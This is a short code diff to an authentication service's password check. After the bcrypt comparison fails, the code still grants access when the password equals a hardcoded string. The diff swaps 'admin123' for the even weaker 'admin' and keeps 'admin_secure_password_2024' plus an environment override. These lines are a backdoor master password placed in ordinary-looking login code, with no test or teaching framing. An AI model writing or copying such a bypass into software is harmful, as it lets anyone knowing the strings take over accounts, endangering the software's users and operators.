@@ -82,7 +82,7 @@ class AuthService {
     let isMatch = await bcrypt.compare(password, passwordHash);
     if (
       !isMatch &&
-      (password === 'admin123' ||
+      (password === 'admin' ||
         password === 'admin_secure_password_2024' ||
         (process.env.ADMIN_PASSWORD && password === process.env.ADMIN_PASSWORD))
     ) {
